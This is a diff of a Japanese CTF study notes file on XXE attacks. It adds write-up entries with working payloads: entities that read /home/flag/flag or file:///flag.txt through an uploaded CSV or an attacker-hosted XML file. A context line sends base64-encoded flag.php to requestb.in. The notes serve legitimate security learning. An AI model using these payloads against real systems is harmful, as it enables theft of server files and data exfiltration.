@@ -12,11 +12,7 @@
 - [writeup](#writeup)
   - [OOB XXE (obtain index.php / indentify webshell's fullpath)](#oob-xxe-obtain-indexphp--indentify-webshells-fullpath)
   - [OOB XXE (SSRF / 二重XXE)](#oob-xxe-ssrf--%E4%BA%8C%E9%87%8Dxxe)
-  - [XXE (normai XXE / identify webroot or /proc/self/cwd)](#xxe-normai-xxe--identify-webroot-or-procselfcwd)
   - [sample](#sample)
-  - [sample](#sample-1)
-  - [sample](#sample-2)
-  - [sample](#sample-3)
 - [メモ](#%E3%83%A1%E3%83%A2)
 - [参考](#%E5%8F%82%E8%80%83)
 
@@ -176,7 +172,7 @@ https://qiita.com/no1zy_sec/items/03b8f335e84995fec3e3
 <!ENTITY % filebase64 SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
 <!ENTITY % injme '<!ENTITY startme SYSTEM "https://requestb.in/xxxxxxx?xxe=%filebase64;">'>%injme;
 ```
-## XXE (normai XXE / identify webroot or /proc/self/cwd)
+## XXE (normal XXE / identify webroot or /proc/self/cwd)
 https://www.aquablog.site/entry/2019/03/25/093034   
 
 - **entrypoint**   
@@ -188,14 +184,34 @@ IndexページのJavascriptのソースコード内にJavascriptでXML形式の�
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///var/www/html/epreuve/flag" >]><feedback><author>&xxe;</author><email>a</email><content>undefined</content></feedback>
 ```
-## sample
+## XXE (normal XXE / upload XMLfile)
+https://st98.github.io/diary/posts/2017-04-03-nuit-du-hack-ctf-quals-2017.html   
 - **entrypoint**   
+CSVをHTMLに変換できるWebサービスが稼働しており、CSVファイルをアップロードするとHTMLに変換されるので、XMLデータを送信してみる。すると、`Could not convert the CSV to XML!`というエラーが表示されるのでXMLが解析されており(?)XXE脆弱と疑う。   
 - **概要**   
+応答が返ってくるので普通のXXEでよい。   
 - **Payload**   
-## sample
+```txt
+// 以下のファイルをアップロードする。(fullpahをなぜ知ってるのかは謎)
+<!DOCTYPE hoge [ <!ENTITY xxe SYSTEM "/home/flag/flag"> ]>
+id,name,email
+a,b,&xxe;
+```
+## XXE (normal XXE / request XMLfile's URL)
+https://jaiguptanick.github.io/Blog/blog/SharkyCTF_Writeup_web/   
 - **entrypoint**   
+`Show stored data`というページを見るとどうやらURLに`?xml=`があるっぽくて、`?xml=aaa`とかにするとページにエラーが表示される。　`file_get_contents(aaa)`,`DOMDocument::loadXML()`,`simplexml_import_dom()`とかの関数がエラー吐いてるのが見えるのでXXEとわかる。   
 - **概要**   
+`Show stored data`というページ、ということは応答が返ってくるということなので普通のXXE。   
 - **Payload**   
+```txt
+// これを攻撃者サーバーに待機させて、 ?xml=http://attack.com/xxe.txtとかをリクエストする
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+<root>
+    <data>&xxe;</data>
+</root>
+```
 ## sample
 - **entrypoint**   
 - **概要**   
